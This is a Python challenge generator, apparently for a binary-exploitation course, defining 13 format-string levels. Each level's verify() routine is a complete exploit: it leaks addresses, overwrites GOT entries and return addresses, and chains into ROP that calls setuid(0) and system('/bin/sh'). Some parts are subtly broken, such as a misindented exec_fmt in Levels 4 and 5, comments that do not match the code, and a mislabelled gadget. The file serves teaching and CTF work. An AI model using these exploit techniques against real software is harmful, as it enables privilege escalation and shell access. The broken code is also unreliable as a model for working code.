import pwnshop
import random
import glob
import os

PWNSHOP_AUTOREGISTER = False

from math import ceil
from pwnshop import Challenge

from pwn import *
context.arch = 'amd64'


class BabyFmtBase(Challenge):
    TEMPLATE_PATH = "babyfmt/babyfmt.c" # which template to use to generate challenge source code

    # turn on all protections by default
    EXEC_STACK = False
    CANARY = True
    PIE = True
    RELRO = "full"
    fmtstr_bytes = 256 # max length of fmtstring

    # basic fmtstring lvls 1 - 6
    intro_chal = False   # Use the intro/beginner template
    stack_secret = False # Store secret val on stack
    secret_ptr = False   # Store pointer to secret val on stack
    bss_read = False     # request a global read
    bss_write = False    # request a global write
    copy_val = False     # request a stack -> global copy

    # Advanced Fmtstring  - lvls 7 - 13
    template_path = "babyfmt/babyfmt.c" # which template to use to generate challenge source code
    fmt_loop = False # whether to run format string loop
    win_func = False # whether win func exists in the challenge
    clear_buf = False # whether to clear buffer after each execution.
                      # with it turns off, students need to realize the input concatenation issue
    print_trash = False # whether to print a leading string to add difficulty to payload generation
    fmt_once = False # whether to run the vulnerable function only once
    filter_dollar = False # whether to allow dollar sign('$')
    do_exit = False # whether to call exit at the end of the vulnerable function

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        self.fmt_padding = self.random.randint(0, 128)

        # padding should be 0x10 aligned
        self.pad_num = random.randint(0x10, 0x200)
        self.pad_num -= self.pad_num % 0x10
        #self.pad_num = 0x10

        # the leading input
        self.trash = "Your input is: " + " " * random.randint(0x1, 0x80) + "\\n"
        #self.trash = "Your input is: " + "  " + "\\n"

        self.random_data_length = self.random.randint(0x10, 128)
        self.random_data_length -= self.random_data_length % 0x10

    def autofmt(self, exe):
        """
        Run pwntools FmtStr module to automatically analyze the binary
        """
        def exec_fmt(payload):
            with process(exe) as r:
                e = r.elf
                payload = payload.replace(b"END", b"HEYHEY")
                r.clean()
                r.sendline(payload)
                r.shutdown(direction="send")
                if self.walkthrough:
                    r.recvuntil(b'Show me what you got :P\n', timeout=0.2)
                data = r.recvuntil(b"HEYHEY", timeout=0.2)
                data = data.replace(b"HEYHEY", b"END")
                return data
        return FmtStr(exec_fmt)

    def autofmt_no_dollar(self, exe):
        """
        manually craft payload to analyze the binary just like pwntools FmtStr module
        but with no dollar sign in the input
        """
        r = process(exe)
        e = r.elf

        payload = b"AAAAAAAABBBBBBBB" + b"%p|"*220
        assert len(payload) < 0x3ff
        r.sendline(payload)
        r.shutdown(direction="send")
        output = r.recvall()
        output = output[output.index(b"AAAAAAAA"):].splitlines()[0]
        output = output.strip().split(b"|")
        for i in range(1, len(output)):
            if b"nil" in output[i]:
                continue
            leak = int(output[i], 16)
            raw = p64(leak)
            if raw.count(b"A") + raw.count(b"B") == 8:
                break
        else:
            raise
        padlen = 8 - raw.count(b"A")
        offset = i + 1

        return offset, padlen

    def leak_ptr(self, r, offset):
        """
        A helper function to help leak pointers from memory
        """
        r.sendline(f"START%{offset}$pHEY\x00")
        r.recvuntil("START")
        output = r.recvuntil("HEY")[:-3]
        if b'nil' in output:
            return 0
        leak = int(output, 16)
        return leak

    def get_buffer_offset(self, exe):
        """
        calculate the buffer offset on stack
        """
        r = process(exe)
        payload = "|".join(f"%p" for _ in range(1, 120))
        assert len(payload) < 0x3ff
        r.sendline(payload)
        r.recvuntil("Your input is:")
        r.recvline()
        output = r.recvline().split(b"|")
        for i in range(len(output)):
            if b'nil' in output[i]:
                continue
            if p64(int(output[i], 16)) == self.trash[:8].encode():
                break
        r.close()
        return i+1

    def get_call_func_offset(self, e):
        """
        get the address of "call func" gadget.
        it is needed to restart an infinite format string loop
        """
        last_call_offset = None
        for line in disasm(e.data[e.symbols["main"]:e.symbols["main"] + 0x200]).splitlines():
            if "call" in line:
                last_call_offset = int(line.split(":")[0], 16)
                continue
            if "ret" in line:
                break
        return last_call_offset

class BabyFmtLevel1(BabyFmtBase):
    """
    Use a formatstring exploit to reveal a *string stored on the stack
    """

    intro_chal = True
    stack_secret = True
    secret_ptr = True

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def verify(self, **kwargs):
            stack_offset = self.random_data_length // 8 + 7
            with self.run_challenge(**kwargs) as r:
                r.recvuntil(b'data!')
                r.sendline(b'%p ' * stack_offset + b'%s')
                r.recvuntil('data!')
                r.recvline()
                r.recvline()
                vals = r.recvuntil(b'What').decode().split()
                r.recvuntil(b'?')
                r.sendline(vals[stack_offset])
                assert self.flag in r.recvall()

class BabyFmtLevel2(BabyFmtBase):
    """
    Use a formatstring exploit to reveal a string stored on the stack
    """

    intro_chal = True
    stack_secret = True
    secret_ptr = False

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def verify(self, **kwargs):
        stack_offset = self.random_data_length // 8 + 7
        with self.run_challenge(**kwargs) as r:
            r.recvuntil(b'data!')
            r.sendline(b'%p ' * (stack_offset + 1) + b'%p')
            r.recvuntil('data!')
            r.recvline()
            r.recvline()
            vals = r.recvuntil(b'What').decode().split()
            r.recvuntil(b'?')
            ans = p64(int(vals[stack_offset], 16))
            ans += p64(int(vals[stack_offset + 1], 16))
            ans = ans.decode().strip('\x00')
            r.sendline(ans)
            assert self.flag in r.recvall()

class BabyFmtLevel3(BabyFmtBase):
    """
    Use a formatstring exploit to read the flag directly from the .bss section
    """

    intro_chal = True
    PIE = False
    bss_read = True

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.bss_padding = self.random.randint(16, 128)
        self.bss_padding -= self.bss_padding % 16

        # Make the padding smaller on this for a wider success window
        self.fmt_padding = self.random.randint(0, 64)

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as r:
            r.recvuntil(b'data!')
            r.sendline(b'YEP\n%43$p\n' + cyclic(0x100))
            r.recvuntil(b'data!\n\n')
            r.recvuntil('YEP\n')
            result = r.recvline().strip()
            needle = p64(int(result.decode(), 16))
            padding = cyclic_find(needle)

        with self.run_challenge(**kwargs) as r:
            e = r.elf
            if self.walkthrough:
                magic_bss_val =  0x60
            else:
                magic_bss_val =  0x40

            flag_addr = e.bss() + magic_bss_val + self.bss_padding

            r.recvuntil(b'data!')
            payload = b'YEP\n%43$s\n' + b'a' * padding
            payload += p64(flag_addr)

            r.sendline(payload)
            assert self.flag in r.recvall()

class BabyFmtLevel4(BabyFmtBase):
    """
    Use a formatstring exploit to set a global variable
    """

    PIE = False
    intro_chal = True
    bss_write = True
    check_win_func = True

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        self.bss_padding = self.random.randint(0, 128)
        self.win_value = self.random.randint(0, 256)

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as r:
            r.recvuntil(b'.bss, to ')
            val = int(r.recvuntil(b'.').strip().decode()[:-1], 16)
            r.recvuntil('located at ')
            addr = int(r.recvuntil(b'!').strip().decode()[:-1], 16)

        self.response = b""
    def exec_fmt(payload):
        with self.run_challenge(**kwargs) as r:
            p = process(r.executable)
            p.recvuntil('data!')
            p.sendline(payload)
            self.response = p.recvall()
            return self.response

        fmt_str = FmtStr(execute_fmt=self.exec_fmt)
        fmt_str.write(addr, val)
        fmt_str.execute_writes()

        assert self.flag in self.response

class BabyFmtLevel5(BabyFmtBase):
    """
    Use a formatstring exploit to set a larger global variable
    """

    PIE = False
    intro_chal = True
    bss_write = True
    check_win_func = True

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        self.bss_padding = self.random.randint(0, 128)
        self.win_value = self.random.randint(0, 2**64-1)

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as r:
            r.recvuntil(b'.bss, to ')
            val = int(r.recvuntil(b'.').strip().decode()[:-1], 16)
            r.recvuntil('located at ')
            addr = int(r.recvuntil(b'!').strip().decode()[:-1], 16)

        self.response = b""
    def exec_fmt(payload):
        with self.run_challenge(**kwargs) as r:
            p = process(r.executable)
            p.recvuntil('data!')
            p.sendline(payload)
            self.response = p.recvall()
            return self.response

        fmt_str = FmtStr(execute_fmt=self.exec_fmt)
        fmt_str.write(addr, val)
        fmt_str.execute_writes()

        assert self.flag in self.response

class BabyFmtLevel6(BabyFmtBase):
    """
    Use a format string exploit to copy a value and overwrite a global variable
    """

    PIE = False
    copy_val = True
    intro_chal = True
    copy_val = True
    check_win_func = True

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.bss_padding = self.random.randint(0, 128)

    def verify(self, **kwargs):

        def find_buffer_start(exe):
                for i in range(400):
                    with process(exe, level='error') as r:
                        r.recvuntil('data!')
                        fstr = f"%{i}$p "
                        r.sendline(fstr.encode() + cyclic(200))
                        r.recvuntil(b'data!\n\n')
                        found = r.recvline().split()[0]
                        try:
                            found = cyclic_find(p64(int(found, 16))[4:])
                            if found >= 0 and found < 16:
                                return (i, found)
                        except:
                            pass

        with self.run_challenge(**kwargs) as r:
            index, buf_offset = find_buffer_start(r.executable)
            r.recvuntil('located at ')
            win_addr = int(r.recvuntil(b'!').strip().decode()[:-1], 16)
            r.recvuntil(b'stack, ')
            secret_offset = int(r.recvuntil(b' ').strip().decode(), 16)

            addr_index = index + (secret_offset - buf_offset)  // 8
            if buf_offset + (self.fmt_padding % 8) > 8:
                index -= 1

            payload = f"%15$*{addr_index}$x"
            payload += f"%{index + 7}$n "
            payload += f"%{index + 7}$p "
            payload += f"%{addr_index}$p "
            payload = payload.ljust(64 - (self.fmt_padding % 8), 'a').encode()
            payload += p64(win_addr)

            r.recvuntil('data!')
            r.sendline(payload)

            assert self.flag in r.recvall()

class BabyFmtLevel7(BabyFmtBase):
    """
    Use a format string exploit to overwrite a GOT entry
    """

    notes = """
        format string loop
        clear buffer each time
        no pie, partial relro
        win function// overwrite retaddr or got table
        """

    PIE = False
    RELRO = "partial"

    win_func = True
    fmt_loop = True
    clear_buf = True

    def verify(self, **kwargs):
        """
        simply use pwntools to analyze the binary to grab offset and then use it to generate
        payload to overwrite printf to win function to get the flag
        """
        with self.run_challenge(**kwargs) as r:
            e = r.elf
            win_addr = e.symbols["win"]
            autofmt = self.autofmt(r.executable)
            offset = autofmt.offset
            assert offset > 0

            writes = {e.got["printf"]: win_addr}
            payload = fmtstr_payload(offset, writes)
            r.clean()
            r.sendline(payload)
            r.clean()
            r.send("A")
            assert "You win" in r.recv().decode()

class BabyFmtLevel8(BabyFmtBase):
    """
    Use a format string exploit to call win
    """

    notes = """
        format string loop
        pie, full relro
        win function// overwrite retaddr
        print leading trash
        """
    win_func = True
    fmt_loop = True
    print_trash = True

    def verify(self, **kwargs):
        """
        1. use pwntools to analyze the binary and get the offset
        2. leak stack address and code base. since verification script needs to be general, it looks for canary
           first for leaking code base
        3. since verification script is general, it looks for the address of the target return address during
           runtime by writing a mark('A') and search for the mark on stack
        4. overwrite the return address with win function
        """
        with self.run_challenge(**kwargs) as r:
            e = r.elf
            autofmt = self.autofmt(r.executable)
            offset = autofmt.offset
            padlen = autofmt.padlen
            assert offset > 0

            # look for canary offset
            for i in range(100, 200):
                leak = self.leak_ptr(r, offset+i)
                if (leak >> 48) > 0:
                    rbp_offset = i + 1
                    retval_offset = i + 2
                    break
            else:
                raise
            stack_ptr = self.leak_ptr(r, offset+rbp_offset)
            ret_addr = self.leak_ptr(r, offset+retval_offset)
            print(hex(stack_ptr), hex(ret_addr))
            code_base = (ret_addr - e.symbols["main"]) & ~0xfff
            assert (stack_ptr >> 44) == 7
            assert (code_base >> 44) == 5
            assert code_base & 0xfff == 0
            win_addr = code_base + e.symbols["win"]

            # get the leading string
            r.clean()
            r.send('A'*8)
            if self.walkthrough:
                r.recvuntil(b'Show me what you got :P\n', timeout=0.2)
            leading = r.recvline()
            num = len(leading)

            # write stack as a mark
            writes = {stack_ptr: 0x41}
            payload = fmtstr_payload(offset, writes, numbwritten=num+padlen)
            r.clean()
            r.sendline(b"A"*padlen + payload.ljust(0x300, b'\x00'))

            # look for the mark
            for i in range(100):
                leak = self.leak_ptr(r, offset + retval_offset + i)
                if leak == 0x41:
                    break
            target_addr = stack_ptr - i*8

            # overwrite return address
            writes = {target_addr: win_addr}
            payload = fmtstr_payload(offset, writes, numbwritten=num+padlen)
            r.clean()
            r.sendline(b"A"*padlen + payload.ljust(0x300, b'\x00'))

            # make sure we land on the return address correctly
            new_retval = self.leak_ptr(r, offset + retval_offset)
            assert new_retval == win_addr, new_retval

            r.send("END")
            assert "You win" in r.recvall().decode()

class BabyFmtLevel9(BabyFmtBase):
    """
    Use a format string exploit to call win.  This time, with no loop.
    """
    notes = """
        no pie, partial relro
        one format string
        win function
        print leading trash
        """
    PIE = False
    RELRO = "partial"

    win_func = True
    fmt_once = True
    print_trash = True
    do_exit = True

    def verify(self, **kwargs):
        """
        Simply use pwntools to solve it just like level7
        """
        with self.run_challenge(**kwargs) as r:
            e = r.elf
            autofmt = self.autofmt(r.executable)
            offset = autofmt.offset
            padlen = autofmt.padlen
            assert offset > 0

            # calculate printed bytes
            num = len(self.trash) - 1

            # overwrite got.exit to win function
            writes = {e.got["exit"]: e.symbols["win"]}
            payload = fmtstr_payload(offset, writes, numbwritten=num+padlen)
            r.clean()
            r.send(b"A"*padlen + payload)

            # check flag
            r.recvuntil(b"A"*padlen)
            output = r.recvall()
            assert b"You win" in output, output

class BabyFmtLevel10(BabyFmtBase):
    """
    Chain a format string exploit into ROP
    """

    notes = """
        no pie, partial relro
        one format string

        print leading trash
        hook main and then do it again
        """

    PIE = False
    RELRO = "partial"

    fmt_once = True
    print_trash = True
    do_exit = True

    def verify(self, **kwargs):
        """
        1. overwrite exit to func to be able to invoke the vulnerable function for infinite times
        2. leak libc address
        3. overwrite strlen to xor rax, rax so it basically makes strlen returns 0 and our input
           is placed at the beginning of the buffer
        4. overwrite memset to gets and overflow
        5. rewrite exit to leave; ret to exit the infinite loop and trigger ROP chain
        """
        with self.run_challenge(**kwargs) as r:
            e = r.elf
            libc = e.libc
            autofmt = self.autofmt(r.executable)
            offset = autofmt.offset
            padlen = autofmt.padlen
            assert offset > 0

            # calculate printed bytes
            num = len(self.trash) - 1

            # overwrite got.exit to the vulnerable function
            writes = {e.got["exit"]: e.symbols["func"]}
            payload = fmtstr_payload(offset, writes, numbwritten=num+padlen)
            r.clean()
            r.send(b"A"*padlen + payload)
            if self.walkthrough:
                r.recvuntil("Use it")

            # leak libc
            payload = ("BBBBBBBB" + f"%{offset+2}$s").encode().ljust(16, b"\x00") + p64(e.got["puts"])
            r.clean()
            r.send(b"A"*padlen + payload)
            r.recvuntil(b"B"*8)
            libc_base = u64(r.recv(6) + b"\x00\x00") - libc.symbols["puts"]
            assert libc_base & 0xfff == 0
            print("libc_base: %#x" % libc_base)

            setuid = libc_base + libc.symbols["setuid"]
            system = libc_base + libc.symbols["system"]
            gets = libc_base + libc.symbols["gets"]
            leave = next(e.search(asm("leave; ret")))
            prdi = libc_base + next(libc.search(asm("pop rdi; ret")))
            sh = libc_base + next(libc.search(b"/bin/sh\x00"))

            # overwrite strlen to "xor rax, rax" so our input will be placed at the start of the buffer
            writes = {e.got["memset"]: gets}
            payload = fmtstr_payload(offset, writes, numbwritten=num+padlen)
            r.clean()
            r.send(b"A"*padlen + payload)

            rop = []
            rop += [prdi, 0]
            rop += [setuid]
            rop += [prdi, sh]
            rop += [system]

            payload = b"A"*(0x400+40) + flat(rop)
            r.sendline(payload)

            # overwrite exit to leave; ret
            writes = {e.got["exit"]: leave}
            payload = fmtstr_payload(offset, writes, numbwritten=num+padlen)
            r.clean()
            r.send(b"A"*padlen + payload)

            # a shell should be spawned
            sleep(0.2)
            r.clean()
            r.sendline("cat flag; exit")
            assert self.flag in r.recvall()

class BabyFmtLevel11(BabyFmtBase):
    """
    Chain a format string exploit into ROP, now with pie!
    """

    notes = """
        pie, partial relro
        two format string
        print leading trash
        """

    RELRO = "partial"
    fmt_twice = True
    print_trash = True
    do_exit = True

    def verify(self, **kwargs):
        """
        1. leak code base first
        2. overwrite exit to func to make func recursively calls func
        3. follow the strategy of level10
        """
        with self.run_challenge(**kwargs) as r:
            e = r.elf
            libc = e.libc
            autofmt = self.autofmt(r.executable)
            offset = autofmt.offset
            padlen = autofmt.padlen
            assert offset > 0

            buf_offset = self.get_buffer_offset(r.executable)

            # locate canary first
            r.clean()
            payload = "|".join(f"%{buf_offset+i}$p" for i in range(100, 200)) + "\x00"
            assert len(payload) < 0x3ff
            r.sendline(payload)
            output = r.recv(timeout=0.2).decode().split("|")
            for i in range(1, len(output)):
                if 'nil' in output[i]:
                    continue
                leak = int(output[i], 16)
                if (leak >> 48) > 0 and leak & 0xff == 0:
                    break
            else:
                raise

            # leak code base
            if output[i+1][2] == '7':
                print("7")
                code_base = (int(output[i+2], 16) - e.symbols["main"]) & ~0xfff
                assert code_base & 0xfff == 0
            elif output[i+1][2] == '5':
                print("5")
                code_base = (int(output[i+4], 16) - e.symbols["main"]) & ~0xfff
                assert code_base & 0xfff == 0
            else:
                raise

            # get trash length
            num = len(self.trash) - 1

            # overwrite exit to func
            writes = {code_base + e.got["exit"]: code_base + e.symbols["func"]}
            payload = fmtstr_payload(offset, writes, numbwritten=num+padlen)
            r.clean()
            r.sendline(b"A"*padlen + payload.ljust(0x300, b'\x00'))

            # leak libc
            r.sendline(b"A"*padlen + b"B"*8 + f"%{offset+2}$s".ljust(8, "A").encode() + p64(code_base + e.got["puts"]) + b"\x00")
            r.recvuntil(b"B"*8)
            libc_base = u64(r.recv(6) + b"\x00\x00") - libc.symbols["puts"]
            gets = libc_base + libc.symbols["gets"]
            setuid = libc_base + libc.symbols["setuid"]
            system = libc_base + libc.symbols["system"]
            sh = libc_base + next(libc.search(b"/bin/sh\x00"))
            prdi = libc_base + next(libc.search(asm("pop rdi; ret")))
            leave = libc_base + next(libc.search(asm("leave; ret")))

            # overwrite memset to gets
            #writes = {code_base + e.got["memset"]: gets, code_base + e.got["exit"]: leave}
            writes = {code_base + e.got["memset"]: gets}
            payload = fmtstr_payload(offset, writes, numbwritten=num+padlen)
            r.clean()
            r.sendline(b"A"*padlen + payload.ljust(0x300, b'\x00'))

            # place rop chain
            rop = []
            rop += [prdi, 0]
            rop += [setuid]
            rop += [prdi, sh]
            rop += [system]
            #r.sendline(cyclic(0x500+40))
            r.sendline(cyclic(0x400+40) + flat(rop) + b"\x00")

            # skip one printf
            r.sendline(b"\x00")

            # overwrite exit to leave; ret to trigger the rop chain
            writes = {code_base + e.got["exit"]: leave}
            payload = fmtstr_payload(offset, writes, numbwritten=num+padlen)
            r.clean()
            r.sendline(b"A"*padlen + payload.ljust(0x300, b'\x00'))

            ## a shell should be spawned here
            r.clean(timeout=1)
            r.sendline("cat flag; exit")
            assert self.flag in r.recvall()

class BabyFmtLevel12(BabyFmtBase):
    """
    Chain a format string exploit into ROP, now with pie and input filtering!
    """

    notes = """
        pie, full relro
        two format string
        filter $
        print leading trash
        """

    filter_dollar = True
    print_trash = True
    fmt_twice = True

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        # padding should be 0x10 aligned
        self.pad_num = random.randint(0x10, 0x80)
        self.pad_num -= self.pad_num % 0x10


    def fix_payload(self, raw_payload, offset, printed, padlen):
        """
        fix payload generated by pwntools so that there is no dollar signs in the payload
        """
        padding_len = offset * 8
        new_offset = offset * 2

        offsets = [int(x.decode()) for x in re.findall(rb"%(\d+)\$", raw_payload)]
        formatters = raw_payload[:-len(offsets)*8]
        pointers = raw_payload[-len(offsets)*8:]
        new_pointers = b""

        # rewrite formatters
        new_formatters = formatters
        for x in offsets:
            new_formatters = new_formatters.replace(f"{x}$".encode(), b"")

        # based on formatters, rewrite points
        ref = new_formatters.split(b"%")
        j = 0
        for i in range(1, len(ref)):
            if b"c" in ref[i]:
                new_pointers += b"\xcc"*8
            elif b"n" in ref[i]:
                new_pointers += pointers[j:j+8]
                j += 8
            else:
                raise
        #new_pointers2 = b""
        #for i in range(0, len(pointers), 8):
        #    new_pointers2 += pointers[i:i+8] * 2
        #    #print(hex(u64(pointers[i:i+8])))
        #print(new_formatters)
        #print(new_pointers)
        #print(len(pointers))
        #print("printed", printed)

        payload = b"A"*padlen + (b"%c"*(new_offset-1) + b"|" + new_formatters).ljust(padding_len, b"_") + new_pointers + b"\x00"
        assert b"_" in payload # make sure there is still room left
        assert b"$" not in payload
        return payload

    def verify(self, **kwargs):
        """
        The same to level11 except for it filters '$'
        This can be done by fixing the payload generated by pwntools
        """
        with self.run_challenge(**kwargs) as r:
            e = r.elf
            libc = e.libc
            offset, padlen = self.autofmt_no_dollar(r.executable)
            assert offset > 0

            # locate canary first
            r.clean()
            payload = "|".join(f"%p" for i in range(0, 180 + self.pad_num // 8)) + "\x00"
            assert len(payload) < 0x3ff
            r.sendline(payload)
            output = r.recv(timeout=0.2).decode().split("|")
            for i in range(1, len(output)):
                if 'nil' in output[i]:
                    continue
                leak = int(output[i], 16)
                if (leak >> 48) > 0 and leak & 0xff == 0:
                    break
            else:
                raise RuntimeError("Can't locate canary")

            # leak code base
            if output[i+1][2] == "7":
                code_base = (int(output[i+2], 16) - e.symbols["main"]) & ~0xfff
                assert code_base & 0xfff == 0
                stack_ptr = int(output[i+1], 16)
                ret_addr = int(output[i+2], 16)
            elif output[i+3][2] == "7":
                code_base = (int(output[i+4], 16) - e.symbols["main"]) & ~0xfff
                assert code_base & 0xfff == 0
                stack_ptr = int(output[i+3], 16)
                ret_addr = int(output[i+4], 16)
            else:
                print(output[i])
                print(output[i+1])
                print(output[i+2])
                print(output[i+3])
                raise
            func_addr = code_base + e.symbols["func"]
            print("stack ptr: %#x" % stack_ptr)
            print(hex(ret_addr), hex(func_addr))

            # leak libc
            for j in range(i, i+0x18):
                if output[j].endswith("0b3"):
                    break
            else:
                raise
            libc_base = (int(output[j], 16) - libc.symbols["__libc_start_main"]) & ~0xfff
            assert libc_base & 0xfff == 0
            setuid = libc_base + libc.symbols["setuid"]
            system = libc_base + libc.symbols["system"]
            execve = libc_base + libc.symbols["execve"]
            puts = libc_base + libc.symbols["puts"]
            sh = libc_base + next(libc.search(b"/bin/sh\x00"))
            prdi = code_base + next(e.search(asm("pop rdi; ret"), executable=True))
            prsi = libc_base + next(libc.search(asm("pop rsi; ret"), executable=True))
            prdx = libc_base + next(libc.search(asm("pop rdi; ret"), executable=True))
            ret = code_base + next(e.search(asm("ret"), executable=True))

            # calculate return location
            #retloc = stack_ptr + 8
            retloc = stack_ptr - (j-i) * 8 + 5*8
            call_func_addr = None

            call_func_addr = code_base + e.symbols["main"] + self.get_call_func_offset(e)

            canary_idx = i
            #for i in range(canary_idx, len(output)):
            #    print(output[i])

            # new stuff for fixing payload
            new_offset = offset * 2
            padding_len = offset * 8
            printed = padlen + new_offset + len(self.trash) - 1

            ## code to confirm the return location
            #payload = b"A"*padlen + (b"%p"*(new_offset-1) + b"|" + b"%p").ljust(padding_len, b"_") + p64(retloc) + b"\x00"
            #assert len(payload) < 0x3ff, hex(len(payload))
            #r.sendline(payload)
            #r.recvuntil("|")
            ##leak = u64(r.recv(6) + b"\x00\x00")
            ##leak = int(r.recv(14), 16)
            ##print(hex(leak))
            #print(r.clean(timeout=0.2))

            # overwrite return value to func to perform attack again
            # should be able to place the whole ROP chain here. But if the ROP chain is too long, our payload will be too long
            #rop = [call_func_addr]
            rop = [call_func_addr]
            writes = {}
            for i in range(len(rop)):
                writes[retloc + i*8] = rop[i]
            raw_payload = fmtstr_payload(new_offset, writes, numbwritten=printed)
            payload = self.fix_payload(raw_payload, offset, printed, padlen)
            r.sendline(payload)
            if self.walkthrough:
                r.recvuntil("again.\n")

            # now we have two more printf before returning
            # first, rewrite the return address to func so we have infinite fsb primitive

            reset_payload = payload
            def write_where_what(addr, value):
                r.sendline(reset_payload + b"\x00")

                writes = {}
                writes[addr] = value
                raw_payload = fmtstr_payload(new_offset, writes, numbwritten=printed)
                payload = self.fix_payload(raw_payload, offset, printed, padlen)
                r.sendline(payload+b"\x00")
                #print(r.recvuntil("again.\n"))

            # write ROP chain on stack
            rop = []
            rop += [prdi, sh]
            rop += [system]
            for i in reversed(range(len(rop))):
                write_where_what(retloc +8 + i*8, rop[i])

            # trigger ROP chain
            write_where_what(retloc, ret)

            # a shell should be spawned
            r.clean(timeout=0.1)
            r.sendline("cat flag; exit")
            assert self.flag in r.recvall()

class BabyFmtLevel13(BabyFmtBase):
    notes = """
        pie, full relro
        one format string
        print leading trash
        """

    print_trash = True
    nested_func = True
    fmt_once = True

    def get_call_func2_offset(self, e):
        last_call_offset = None
        for line in disasm(e.data[e.symbols["func"]:e.symbols["func"] + 0x200]).splitlines():
            print(line)
            if "call" in line:
                last_call_offset = int(line.split(":")[0], 16)
                continue
            if "ret" in line:
                break
        print(hex(e.symbols["func"]), hex(last_call_offset))
        return e.symbols["func"] + last_call_offset

    def analyze_bin(self, exe):
        # get a stack dump first
        r = process(exe)
        payload = "|" + "|".join(f"%p" for i in range(0, 180 + self.pad_num // 8)) + "\x00"
        assert len(payload) < 0x3ff
        r.sendline(payload)
        output = r.recvall().decode().split("|")

        # locate canary
        for i in range(1, len(output)):
            if 'nil' in output[i]:
                continue
            leak = int(output[i], 16)
            if (leak >> 48) > 0 and leak & 0xff == 0:
                break
        else:
            raise RuntimeError("Can't locate canary")
        canary_idx = i

        # locate frame pointer
        if output[canary_idx+1][2] == '7':
            print("1")
            fp_idx = canary_idx + 1
        elif output[canary_idx+3][2] == '7':
            print("2")
            fp_idx = canary_idx + 3
        else:
            raise
        #print(output[canary_idx:])

        # locate next frame pointer
        for i in range(fp_idx+1, 0x100):
            if output[i][2] == '7':
                break
        else:
            raise
        ptr_idx = i

        # locate __libc_start_main
        for i in range(fp_idx+1, 0x100):
            if output[i].endswith("0b3"):
                break
        else:
            raise
        libc_idx = i
        r.close()

        # now get the frame pointer values
        r = process(exe)
        r.sendline(f"|%{fp_idx}$p|%{ptr_idx}$p|%{fp_idx+1}$p")
        output = r.recvall().decode().strip().split("|")[1:]
        pointers = [int(x, 16) for x in output]
        r.close()
        print(hex(pointers[2]))

        # we want them to have only one byte difference
        fp_val = pointers[0]
        ptr_val = pointers[1]
        assert p64(fp_val)[1:] == p64(ptr_val)[1:]

        return fp_idx, ptr_idx, fp_val, ptr_val, libc_idx

    def verify(self, **kwargs):
        """
        The solution to this challenge requires 4bit bruteforce.
        The verification script works only for a specific stack layout.
        stack layout can be fixed by disabling ASLR on the system.

        the idea of the solution is not well-known.
        It bypasses the snapshot mechanism in printf so that pointers got modified during the attack
        can be reused for later use.
        The snapshot mechanism is invoked when a positional argument is encountered. All the arguments used
        in the format string will be saved in a snapshot. For example, there is a pointer 0x41424300 at rsp+8
        and the snapshot mechanism is invoked. After that, even if the value at rsp+8 is changed, 0x41424300
        will still be used for format string because is is in the snapshot.
        The way to bypass is not to use positional arguments.

        the solution uses the fact that saved rbp forms a chain on stack

        1. overwrite a saved rbp to pointing to a ret address
        2. overwrite the ret address to func again by partial overwrite
        3. and at that same time leak all information: libc address, stack address etc.
        4. step1-3 is in one single input
        5. now overwrite memset to gets like before to trigger ROP chain
        """
        with self.run_challenge(**kwargs) as r:
            e = r.elf
            libc = e.libc
            offset, padlen = self.autofmt_no_dollar(r.executable)
            assert offset > 0

            # analyze this binary to understand the memory layout
            call_func2_offset = self.get_call_func2_offset(e)
            fp_offset, ptr_offset, fp_val, ptr_val, libc_offset = self.analyze_bin(r.executable)
            #print(hex(fp_val), hex(ptr_val))

            # calculate stuff
            byte = ((fp_val & 0xff) + 8)
            assert byte < 0x100
            printed = len(self.trash) - 1

            # construct payload
            payload = "A" * padlen # pad to 8 aligned
            printed += padlen

            payload += "%c" * (fp_offset-2) # pad to push ptr to fp_offset
            printed += (fp_offset - 2)

            payload += "%{}c%hhn".format((byte + 0x1000 - printed) % 0x100) # overwrite the second fp pointer and make it point to return address
            printed += (byte + 0x1000 - printed) % 0x100

            assert ptr_offset - 2 - fp_offset >= 0 # pad to push ptr to ptr_offset
            payload += "%c" * (ptr_offset - 2 - fp_offset)
            printed += ptr_offset - 2 - fp_offset

            short = call_func2_offset + 0x4000 # overwrite return address to call func2
            print(hex(short))
            payload += "%{}c%hn".format((0x10000 - printed + short) % 0x10000)
            print(hex(printed + 0x10000 - printed))
            printed += (0x10000 + short - printed) % 0x10000

            byte3 = (ptr_val & 0xff) # rewrite ptr back to the original value so we call func2 again safely
            payload += "%{}c%{}$hhn".format((byte3 + 0x1000 - printed) % 0x200, fp_offset)
            printed = byte3

            payload += "___%{}$p|%{}$p|%{}$p|%{}$p___\x00".format(fp_offset, ptr_offset, libc_offset, fp_offset+1) # for leak
            assert len(payload) < 0x3ff

            # trigger, fingers crossed
            r.sendline(payload)

            # process the leak
            r.recvuntil("___")
            leaks = [int(x, 16) for x in r.recvuntil(b"___")[:-3].split(b"|")]
            code_base = (leaks[3] - call_func2_offset) & ~0xfff
            libc_base = (leaks[2] - libc.symbols["__libc_start_main"]) & ~0xfff
            retloc = leaks[1]
            call_func2_addr = code_base + call_func2_offset
            print("code_base: %#x" % code_base)
            print("libc_base: %#x" % libc_base)
            print("retloc: %#x" % retloc)
            print("call_func2_addr: %#x" % call_func2_addr)

            # calculation
            setuid = libc_base + libc.symbols["setuid"]
            system = libc_base + libc.symbols["system"]
            sh = libc_base + next(libc.search(b"/bin/sh\x00"))
            prdi = code_base + next(e.search(asm("pop rdi; ret"), executable=True))

            # construct ROP chain here
            r.clean()
            rop = []
            rop += [prdi, 0]
            rop += [setuid]
            rop += [prdi, sh]
            rop += [system]

            writes = {}
            for i in range(len(rop)):
                writes[retloc + i*8] = rop[i]
            payload = fmtstr_payload(offset, writes, numbwritten=(len(self.trash)-1 + padlen))
            assert len(payload) < 0x3ff

            r.sendline(b"A"*padlen + payload + b"\x00")

            # a shell should be spawned
            r.clean(timeout=0.1)
            r.sendline("cat flag; exit")
            assert self.flag in r.recvall()

